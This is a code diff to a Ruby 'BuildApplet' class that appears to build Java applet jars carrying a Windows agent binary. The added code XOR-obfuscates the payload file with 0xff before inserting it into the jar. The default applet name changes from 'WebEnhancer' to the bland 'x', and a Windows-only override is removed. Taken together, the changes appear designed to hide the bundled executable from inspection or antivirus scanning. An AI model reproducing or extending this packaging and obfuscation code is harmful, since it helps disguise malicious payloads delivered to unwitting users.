@@ -18,9 +18,6 @@ class BuildApplet < Build
   def generate(params)
     trace :debug, "Build: generate: #{params}"
 
-    # TODO: remove when macos is supported again
-    params['platforms'] = ['windows']
-
     params['platforms'].each do |platform|
       build = Build.factory(platform.to_sym)
 
@@ -49,22 +46,35 @@ class BuildApplet < Build
     end
   end
 
+   def xor_encrypt(inputfile, outputfile)
+    trace :debug, "#{inputfile} -> #{outputfile}"
+    pass_char = 0xff
+
+    buf = File.open(inputfile,"rb") { |f| f.read }      
+    obfuscated = buf.unpack("c*").collect {|c| c ^ pass_char}
+    File.open(outputfile,"wb") { |f| f.write(obfuscated.pack("c*")) }
+  end
+  
   def melt(params)
     trace :debug, "Build: melt #{params}"
 
-    @appname = params['appname'] || 'WebEnhancer'
+    @appname = params['appname'] || 'x'
 
-    FileUtils.cp path('WebEnhancer.jar'), path(@appname + '.jar')
+    FileUtils.cp path('x.jar'), path(@appname + '.jar')
 
     # for some reason we cannot use the internal zip library, use the system "zip -u" to update a file into the jar
     #Zip::ZipFile.open(path(@appname + '.jar'), Zip::ZipFile::CREATE) do |z|
     #  z.file.open('mac', "w") { |f| f.write File.open(path('output_osx'), 'rb') {|f| f.read} } if File.exist? path('output_osx')
     #  z.file.open('win', "w") { |f| f.write File.open(path('output_windows'), 'rb') {|f| f.read} } if File.exist? path('output_windows')
     #end
-    File.rename path('output_osx'), path('mac') if File.exist? path('output_osx')
-    File.rename path('output_windows'), path('win') if File.exist? path('output_windows')
+    
+    #obfuscate output_windows with xor 0xff > w
+    xor_encrypt(path('output_windows'), path('w'))
 
-    CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} win", {:chdir => path('')} if File.exist? path('win')
+    #File.rename path('output_osx'), path('mac') if File.exist? path('output_osx')
+    #File.rename path('output_windows'), path('win') if File.exist? path('output_windows')
+
+    CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} w", {:chdir => path('')} if File.exist? path('w')
     # TODO: remove when macos is supported again
     #CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} mac", {:chdir => path('')} if File.exist? path('mac')
 
